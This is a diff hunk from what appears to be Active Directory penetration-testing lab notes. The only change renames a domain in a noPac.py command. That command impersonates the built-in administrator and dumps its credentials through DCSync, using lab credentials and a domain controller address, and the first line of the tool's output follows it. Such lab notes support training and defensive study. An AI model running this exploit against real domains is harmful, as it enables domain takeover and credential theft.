@@ -103,7 +103,7 @@ We could then use the ccache file to perform a pass-the-ticket and perform furth
 
  `Using noPac to DCSync the Built-in Administrator Account`
 ```shell
-$ sudo python3 noPac.py echoridge.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
+$ sudo python3 noPac.py echoridge.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user echoridge/administrator
 
                                                                     
 [*] Current ms-DS-MachineAccountQuota = 10
